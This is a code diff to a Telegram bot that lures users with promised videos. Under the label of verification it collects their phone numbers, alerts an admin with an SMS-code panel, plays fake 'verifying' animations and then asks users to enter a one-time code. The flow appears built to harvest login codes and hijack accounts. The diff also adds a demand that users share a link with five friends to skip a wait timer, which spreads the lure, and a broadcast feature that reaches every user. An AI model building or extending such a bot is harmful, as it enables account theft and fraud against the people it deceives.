@@ -14,30 +14,35 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = update.effective_user.id
         logging.info(f"Start command received from user: {user_id}")
+        
         conn = get_db_connection()
         user = conn.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)).fetchone()
+        
+        # Load Dynamic Welcome Settings
+        welcome_img = conn.execute("SELECT value FROM settings WHERE key = 'welcome_img'").fetchone()['value']
+        welcome_caption = conn.execute("SELECT value FROM settings WHERE key = 'welcome_caption'").fetchone()['value']
         
         if not user or not user['is_verified']:
             logging.info(f"User {user_id} not verified, sending welcome message.")
             try:
                 await update.message.reply_photo(
-                    photo=WELCOME_IMAGE_URL,
-                    caption=WELCOME_CAPTION,
+                    photo=welcome_img,
+                    caption=welcome_caption,
                     reply_markup=get_welcome_keyboard(),
                     parse_mode='Markdown'
                 )
             except Exception as photo_err:
                 logging.error(f"Error sending photo: {photo_err}. Falling back to text.")
                 await update.message.reply_text(
-                    text=WELCOME_CAPTION,
+                    text=welcome_caption,
                     reply_markup=get_welcome_keyboard(),
                     parse_mode='Markdown'
                 )
             return START
         else:
-            logging.info(f"User {user_id} is verified, sending Get File button.")
+            logging.info(f"User {user_id} is verified, sending Get Video button.")
             await update.message.reply_text(
-                "Welcome back! ✨\nTap below to get your next file.",
+                "Welcome back! ✨\nTap below to get your next video.",
                 reply_markup=get_get_file_keyboard()
             )
             return ConversationHandler.END
@@ -46,9 +51,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Something went wrong. Please try again later. ⚠️")
 
 async def proceed_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.message.reply_text(
+    # This is now triggered by a Reply Keyboard Button "Proceed Automatically 🚀"
+    # We handle it via MessageHandler in main.py
+    await update.message.reply_text(
         "To verify your identity, please share your phone number using the button below. 📱",
         reply_markup=get_contact_keyboard()
     )
@@ -63,7 +68,6 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn = get_db_connection()
         conn.execute("INSERT OR IGNORE INTO users (user_id, phone) VALUES (?, ?)", (user.id, contact.phone_number))
         conn.commit()
-        logging.info(f"User {user.id} saved to database.")
         
         admin_text = (
             "👤 *New Verification Request*\n\n"
@@ -79,16 +83,13 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         status_msg = await update.message.reply_text("Processing... 🔄", reply_markup=ReplyKeyboardRemove())
         context.user_data['status_msg_id'] = status_msg.message_id
         
-        logging.info(f"Sending notification to admin for user {user.id}...")
         # Send admin notification in background
         asyncio.create_task(send_to_admin(context, admin_text, reply_markup=get_admin_sms_keyboard(user.id)))
         
-        logging.info("Starting animations...")
         await animate_message(update, context, SUBMITTING_MSGS, target_message=status_msg)
         await animate_message(update, context, VERIFYING_MSGS, target_message=status_msg)
         await animate_message(update, context, WAITING_CODE_MSGS, target_message=status_msg)
         
-        logging.info(f"User {user.id} now in AWAITING_CODE state.")
         return AWAITING_CODE
     except Exception as e:
         logging.error(f"Error in contact_handler: {e}")
@@ -135,8 +136,11 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
-    user_id = int(data.split("_")[1])
     
+    if data == "admin_panel":
+        return await admin_menu_callback(update, context)
+        
+    user_id = int(data.split("_")[1])
     conn = get_db_connection()
     if data.startswith("approve_"):
         conn.execute("UPDATE users SET is_verified = 1 WHERE user_id = ?", (user_id,))
@@ -149,27 +153,26 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 async def get_file_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
+    # This can be triggered by Reply Button "📥 Get Video" or Inline Button
     user_id = update.effective_user.id
     
     conn = get_db_connection()
     user = conn.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)).fetchone()
     
     if not user or not user['is_verified']:
-        await query.answer("You are not verified! ❌", show_alert=True)
+        await update.effective_message.reply_text("You are not verified! ❌")
         return
 
     next_index = user['last_file_index'] + 1
     file = conn.execute("SELECT * FROM files WHERE file_index = ?", (next_index,)).fetchone()
     
     if not file:
-        await query.answer("No more files available for now! Check back later. ✨", show_alert=True)
+        await update.effective_message.reply_text("No more videos available for now! Check back later. ✨")
         return
 
     # Check Cooldown
     if user['last_received_at']:
         last_time = datetime.fromisoformat(user['last_received_at'])
-        # Use file-specific cooldown or global
         cooldown = file['cooldown_seconds']
         if cooldown is None:
             g_cooldown = conn.execute("SELECT value FROM settings WHERE key = 'global_cooldown'").fetchone()
@@ -182,14 +185,18 @@ async def get_file_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             diff = wait_until - now
             hours, remainder = divmod(int(diff.total_seconds()), 3600)
             minutes, seconds = divmod(remainder, 60)
-            await query.answer(f"⏳ Next file in: {hours:02d}:{minutes:02d}:{seconds:02d}", show_alert=True)
+            
+            # Offer Link Sharing to skip timer
+            skip_link = conn.execute("SELECT value FROM settings WHERE key = 'skip_timer_link'").fetchone()['value']
+            await update.effective_message.reply_text(
+                f"⏳ *Next video in:* {hours:02d}:{minutes:02d}:{seconds:02d}\n\n"
+                f"🚀 *Want to skip the timer?*\nShare this link with 5 friends: {skip_link}",
+                parse_mode='Markdown'
+            )
             return
 
     # Send File
-    await query.answer("Sending your file... 📥")
-    
     try:
-        sent_msg = None
         params = {
             "chat_id": user_id,
             "caption": file['caption'],
@@ -204,36 +211,28 @@ async def get_file_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             sent_msg = await context.bot.send_document(document=file['file_id'], **params)
 
-        # Update User
         conn.execute("UPDATE users SET last_file_index = ?, last_received_at = ? WHERE user_id = ?", 
                      (next_index, datetime.now().isoformat(), user_id))
         conn.commit()
 
-        # Handle Auto-Delete
         if file['auto_delete_seconds'] > 0:
             async def delete_after():
                 await asyncio.sleep(file['auto_delete_seconds'])
-                try:
-                    await context.bot.delete_message(chat_id=user_id, message_id=sent_msg.message_id)
-                except:
-                    pass
+                try: await context.bot.delete_message(chat_id=user_id, message_id=sent_msg.message_id)
+                except: pass
             asyncio.create_task(delete_after())
 
     except Exception as e:
-        await query.message.reply_text(f"Error sending file: {str(e)}")
+        await update.effective_message.reply_text(f"Error sending file: {str(e)}")
 
 # --- Admin Panel ---
 
 async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Allow if user is the admin OR if command is in the designated admin group
     user_id = str(update.effective_user.id)
     chat_id = str(update.effective_chat.id)
-    
-    # Clean IDs for comparison
     clean_admin_chat_id = ADMIN_CHAT_ID.strip()
     
     if user_id != clean_admin_chat_id and chat_id != clean_admin_chat_id:
-        logging.warning(f"Unauthorized admin access attempt by {user_id} in chat {chat_id}")
         return
         
     await update.message.reply_text("🔑 Please enter the Admin Secret Key:")
@@ -249,8 +248,8 @@ async def admin_auth_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
 async def admin_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    await query.answer()
-    data = query.data
+    if query: await query.answer()
+    data = query.data if query else "admin_panel"
 
     if data == "admin_file_list":
         conn = get_db_connection()
@@ -267,6 +266,14 @@ async def admin_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         await query.message.edit_text("📤 Please send/forward the file (Photo, Video, or Document):")
         return UPLOAD_FILE
         
+    elif data == "admin_broadcast":
+        await query.message.edit_text("📢 Send the message (Text, Photo, or Video) you want to broadcast to ALL users:")
+        return BROADCAST_SEND
+
+    elif data == "admin_edit_welcome":
+        await query.message.edit_text("🖼 Send the NEW Welcome Image URL:")
+        return EDIT_WELCOME_IMG
+
     elif data == "admin_global_cooldown":
         await query.message.edit_text("⏱ Select Global Cooldown Time:", reply_markup=get_timer_options_keyboard())
         
@@ -284,58 +291,65 @@ async def admin_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         await query.message.edit_text(stats, reply_markup=get_admin_main_keyboard(), parse_mode='Markdown')
         
     elif data == "admin_panel":
-        await query.message.edit_text("🏠 *Admin Main Menu*", reply_markup=get_admin_main_keyboard(), parse_mode='Markdown')
+        msg_text = "🏠 *Admin Main Menu*"
+        if query: await query.message.edit_text(msg_text, reply_markup=get_admin_main_keyboard(), parse_mode='Markdown')
+        else: await update.message.reply_text(msg_text, reply_markup=get_admin_main_keyboard(), parse_mode='Markdown')
 
     return ADMIN_PANEL
 
-async def admin_file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    file_id = None
-    file_type = None
-    caption = update.message.caption or "No caption"
+# --- Advanced Admin Handlers ---
+
+async def broadcast_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    conn = get_db_connection()
+    users = conn.execute("SELECT user_id FROM users").fetchall()
     
-    if update.message.photo:
-        file_id = update.message.photo[-1].file_id
-        file_type = 'photo'
-    elif update.message.video:
-        file_id = update.message.video.file_id
-        file_type = 'video'
-    elif update.message.document:
-        file_id = update.message.document.file_id
-        file_type = 'document'
+    success = 0
+    fail = 0
     
-    if file_id:
-        conn = get_db_connection()
-        max_idx = conn.execute("SELECT MAX(file_index) FROM files").fetchone()[0] or 0
-        cursor = conn.execute(
-            "INSERT INTO files (file_id, file_type, caption, file_index) VALUES (?, ?, ?, ?)",
-            (file_id, file_type, caption, max_idx + 1)
-        )
-        db_id = cursor.lastrowid
-        conn.commit()
+    status_msg = await update.message.reply_text(f"🚀 Broadcasting to {len(users)} users...")
+    
+    for u in users:
+        try:
+            if update.message.photo:
+                await context.bot.send_photo(chat_id=u['user_id'], photo=update.message.photo[-1].file_id, caption=update.message.caption)
+            elif update.message.video:
+                await context.bot.send_video(chat_id=u['user_id'], video=update.message.video.file_id, caption=update.message.caption)
+            else:
+                await context.bot.send_message(chat_id=u['user_id'], text=update.message.text)
+            success += 1
+        except:
+            fail += 1
+        await asyncio.sleep(0.05) # Avoid flood limits
         
-        file_data = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
-        await update.message.reply_text(
-            f"✅ File Uploaded Successfully!\nIndex: {file_data['file_index']}\nCaption: {caption}",
-            reply_markup=get_file_settings_keyboard(db_id, file_data['cooldown_seconds'], file_data['protect_content'], file_data['auto_delete_seconds'])
-        )
-        return ADMIN_PANEL
-    return UPLOAD_FILE
+    await status_msg.edit_text(f"✅ Broadcast Complete!\nSuccess: {success}\nFailed: {fail}")
+    return ADMIN_PANEL
+
+async def edit_welcome_img_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    new_url = update.message.text
+    conn = get_db_connection()
+    conn.execute("UPDATE settings SET value = ? WHERE key = 'welcome_img'", (new_url,))
+    conn.commit()
+    await update.message.reply_text("✅ Welcome Image updated! Now send the NEW Welcome Caption:")
+    return EDIT_WELCOME_CAPTION
+
+async def edit_welcome_caption_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    new_caption = update.message.text
+    conn = get_db_connection()
+    conn.execute("UPDATE settings SET value = ? WHERE key = 'welcome_caption'", (new_caption,))
+    conn.commit()
+    await update.message.reply_text("✅ Welcome Caption updated!", reply_markup=get_admin_main_keyboard())
+    return ADMIN_PANEL
 
 async def file_manage_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
-    
     parts = data.split("_")
-    action = parts[0]
     db_id = int(parts[2])
     
     conn = get_db_connection()
     file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
-    
-    if not file:
-        await query.answer("File not found! ❌")
-        return ADMIN_PANEL
+    if not file: return ADMIN_PANEL
 
     if data.startswith("fmanage_") or data.startswith("fset_back_"):
         await query.message.edit_text(
@@ -343,35 +357,28 @@ async def file_manage_callback(update: Update, context: ContextTypes.DEFAULT_TYP
             reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']),
             parse_mode='Markdown'
         )
-        
     elif data.startswith("fset_timer_"):
         await query.message.edit_text("⏱ Select Timer for this file:", reply_markup=get_timer_options_keyboard(db_id))
-        
     elif data.startswith("fset_sharing_"):
         new_val = 0 if file['protect_content'] else 1
         conn.execute("UPDATE files SET protect_content = ? WHERE id = ?", (new_val, db_id))
         conn.commit()
         file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
         await query.message.edit_reply_markup(reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
-        
     elif data.startswith("fset_autodel_"):
         await query.message.edit_text("🗑 Select Auto-Delete time:", reply_markup=get_autodelete_options_keyboard(db_id))
-        
     elif data.startswith("fset_rename_"):
         await query.message.edit_text(f"✏️ Current Caption: `{file['caption']}`\n\nSend the new caption:")
         context.user_data['editing_file_id'] = db_id
         return RENAME_FILE
-        
     elif data.startswith("fset_delete_"):
         conn.execute("DELETE FROM files WHERE id = ?", (db_id,))
-        # Reorder remaining files
         remaining = conn.execute("SELECT id FROM files ORDER BY file_index ASC").fetchall()
         for idx, r in enumerate(remaining, 1):
             conn.execute("UPDATE files SET file_index = ? WHERE id = ?", (idx, r['id']))
         conn.commit()
-        await query.answer("File deleted and list reordered! 🗑")
+        await query.answer("File deleted! 🗑")
         return await admin_menu_callback(update, context)
-
     elif data.startswith("fset_up_") or data.startswith("fset_down_"):
         curr_idx = file['file_index']
         target_idx = curr_idx - 1 if "up" in data else curr_idx + 1
@@ -380,71 +387,94 @@ async def file_manage_callback(update: Update, context: ContextTypes.DEFAULT_TYP
             conn.execute("UPDATE files SET file_index = ? WHERE id = ?", (target_idx, db_id))
             conn.execute("UPDATE files SET file_index = ? WHERE id = ?", (curr_idx, other['id']))
             conn.commit()
-            await query.answer("Moved! ⬆️⬇️")
-            # Refresh view
             file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
             await query.message.edit_text(
                 f"🛠 *Managing File #{file['file_index']}*\nCaption: {file['caption']}",
                 reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']),
                 parse_mode='Markdown'
             )
-        else:
-            await query.answer("Cannot move further! ⚠️")
-
+        else: await query.answer("Cannot move further! ⚠️")
     return ADMIN_PANEL
 
-async def file_rename_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    new_caption = update.message.text
-    db_id = context.user_data.get('editing_file_id')
+# --- Existing Handlers Continued ---
+
+async def admin_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        query = update.callback_query
+        data = query.data
+        if data == "admin_panel": return await admin_menu_callback(update, context)
+        
+        parts = data.split("_")
+        if "done" in data:
+            user_id = int(parts[3])
+            await context.bot.send_message(chat_id=user_id, text=WAITING_FOR_ADMIN_MSG)
+            await asyncio.sleep(1)
+            await context.bot.send_message(chat_id=user_id, text=f"{ENTER_CODE_MSG}\n\nCurrent: `____`", reply_markup=get_otp_keyboard(), parse_mode='Markdown')
+            await query.message.edit_text(f"✅ Code request sent to user (ID: {user_id}).")
+        else:
+            user_id = int(parts[2])
+            await query.answer(f"Digit {parts[3]} selected")
+    except Exception as e:
+        logging.error(f"Error in admin_sms_handler: {e}")
+
+async def admin_file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    file_id, file_type = None, None
+    caption = update.message.caption or "No caption"
+    if update.message.photo: file_id, file_type = update.message.photo[-1].file_id, 'photo'
+    elif update.message.video: file_id, file_type = update.message.video.file_id, 'video'
+    elif update.message.document: file_id, file_type = update.message.document.file_id, 'document'
     
+    if file_id:
+        conn = get_db_connection()
+        max_idx = conn.execute("SELECT MAX(file_index) FROM files").fetchone()[0] or 0
+        cursor = conn.execute("INSERT INTO files (file_id, file_type, caption, file_index) VALUES (?, ?, ?, ?)", (file_id, file_type, caption, max_idx + 1))
+        db_id = cursor.lastrowid
+        conn.commit()
+        file_data = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
+        await update.message.reply_text(f"✅ File Uploaded!\nIndex: {file_data['file_index']}", reply_markup=get_file_settings_keyboard(db_id, file_data['cooldown_seconds'], file_data['protect_content'], file_data['auto_delete_seconds']))
+        return ADMIN_PANEL
+    return UPLOAD_FILE
+
+async def file_rename_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    db_id = context.user_data.get('editing_file_id')
     if db_id:
         conn = get_db_connection()
-        conn.execute("UPDATE files SET caption = ? WHERE id = ?", (new_caption, db_id))
+        conn.execute("UPDATE files SET caption = ? WHERE id = ?", (update.message.text, db_id))
         conn.commit()
         file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
-        await update.message.reply_text(
-            f"✅ Caption updated for File #{file['file_index']}",
-            reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds'])
-        )
+        await update.message.reply_text(f"✅ Caption updated for File #{file['file_index']}", reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
     return ADMIN_PANEL
 
 async def timer_setting_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    await query.answer()
     data = query.data
-    
     conn = get_db_connection()
-    if data.startswith("time_"): # Per-file
+    if data.startswith("time_"):
         parts = data.split("_")
-        db_id = int(parts[1])
-        val = parts[2]
+        db_id, val = int(parts[1]), parts[2]
         if val == "custom":
             await query.message.edit_text("✏️ Enter cooldown in minutes:")
             context.user_data['setting_timer_for'] = db_id
             return SET_COOLDOWN
-        else:
-            conn.execute("UPDATE files SET cooldown_seconds = ? WHERE id = ?", (int(val), db_id))
-            conn.commit()
-            return await file_manage_callback(update, context)
-            
-    elif data.startswith("gtime_"): # Global
+        conn.execute("UPDATE files SET cooldown_seconds = ? WHERE id = ?", (int(val), db_id))
+        conn.commit()
+        return await file_manage_callback(update, context)
+    elif data.startswith("gtime_"):
         val = data.split("_")[1]
         if val == "custom":
             await query.message.edit_text("✏️ Enter global cooldown in minutes:")
             context.user_data['setting_timer_for'] = "global"
             return SET_COOLDOWN
-        else:
-            conn.execute("UPDATE settings SET value = ? WHERE key = 'global_cooldown'", (val,))
-            conn.commit()
-            await query.message.edit_text(f"✅ Global Cooldown set to {int(val)//60} minutes.", reply_markup=get_admin_main_keyboard())
-            return ADMIN_PANEL
+        conn.execute("UPDATE settings SET value = ? WHERE key = 'global_cooldown'", (val,))
+        conn.commit()
+        await query.message.edit_text(f"✅ Global Cooldown set to {int(val)//60} minutes.", reply_markup=get_admin_main_keyboard())
+        return ADMIN_PANEL
 
 async def custom_timer_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         minutes = int(update.message.text)
         seconds = minutes * 60
         target = context.user_data.get('setting_timer_for')
-        
         conn = get_db_connection()
         if target == "global":
             conn.execute("UPDATE settings SET value = ? WHERE key = 'global_cooldown'", (str(seconds),))
@@ -452,78 +482,34 @@ async def custom_timer_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         else:
             conn.execute("UPDATE files SET cooldown_seconds = ? WHERE id = ?", (seconds, target))
             file = conn.execute("SELECT * FROM files WHERE id = ?", (target,)).fetchone()
-            await update.message.reply_text(f"✅ Cooldown for File #{file['file_index']} set to {minutes} minutes.", 
-                                           reply_markup=get_file_settings_keyboard(target, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
+            await update.message.reply_text(f"✅ Cooldown for File #{file['file_index']} set to {minutes} minutes.", reply_markup=get_file_settings_keyboard(target, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
         conn.commit()
-    except ValueError:
-        await update.message.reply_text("Please enter a valid number! ⚠️")
-        return SET_COOLDOWN
+    except: return SET_COOLDOWN
     return ADMIN_PANEL
 
 async def autodelete_setting_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    await query.answer()
     data = query.data
-    
     parts = data.split("_")
-    db_id = int(parts[1])
-    val = parts[2]
-    
+    db_id, val = int(parts[1]), parts[2]
     conn = get_db_connection()
     if val == "custom":
         await query.message.edit_text("✏️ Enter auto-delete time in minutes:")
         context.user_data['setting_autodel_for'] = db_id
         return SET_AUTO_DELETE
-    else:
-        conn.execute("UPDATE files SET auto_delete_seconds = ? WHERE id = ?", (int(val), db_id))
-        conn.commit()
-        return await file_manage_callback(update, context)
+    conn.execute("UPDATE files SET auto_delete_seconds = ? WHERE id = ?", (int(val), db_id))
+    conn.commit()
+    return await file_manage_callback(update, context)
 
 async def custom_autodelete_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         minutes = int(update.message.text)
         seconds = minutes * 60
         db_id = context.user_data.get('setting_autodel_for')
-        
         conn = get_db_connection()
         conn.execute("UPDATE files SET auto_delete_seconds = ? WHERE id = ?", (seconds, db_id))
         conn.commit()
         file = conn.execute("SELECT * FROM files WHERE id = ?", (db_id,)).fetchone()
-        await update.message.reply_text(f"✅ Auto-Delete for File #{file['file_index']} set to {minutes} minutes.", 
-                                       reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
-    except ValueError:
-        await update.message.reply_text("Please enter a valid number! ⚠️")
-        return SET_AUTO_DELETE
+        await update.message.reply_text(f"✅ Auto-Delete for File #{file['file_index']} set to {minutes} minutes.", reply_markup=get_file_settings_keyboard(db_id, file['cooldown_seconds'], file['protect_content'], file['auto_delete_seconds']))
+    except: return SET_AUTO_DELETE
     return ADMIN_PANEL
-
-async def admin_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handles admin sending SMS/Code prompt to user."""
-    try:
-        query = update.callback_query
-        data = query.data
-        logging.info(f"Admin SMS callback received: {data}")
-        
-        parts = data.split("_")
-        # admin_sms_done_USERID or admin_sms_USERID_DIGIT
-        if "done" in data:
-            user_id = int(parts[3])
-            await query.answer("Sending code request to user... ✅")
-            
-            # Tell user to enter code
-            await context.bot.send_message(chat_id=user_id, text=WAITING_FOR_ADMIN_MSG)
-            await asyncio.sleep(1)
-            await context.bot.send_message(
-                chat_id=user_id, 
-                text=f"{ENTER_CODE_MSG}\n\nCurrent: `____`", 
-                reply_markup=get_otp_keyboard(),
-                parse_mode='Markdown'
-            )
-            await query.message.edit_text(f"✅ Code request sent to user (ID: {user_id}).")
-        else:
-            user_id = int(parts[2])
-            digit = parts[3]
-            await query.answer(f"Digit {digit} selected")
-            # You can add logic here to show selected digits to admin if needed
-    except Exception as e:
-        logging.error(f"Error in admin_sms_handler: {e}")
-        await query.answer("Error processing request! ❌", show_alert=True)
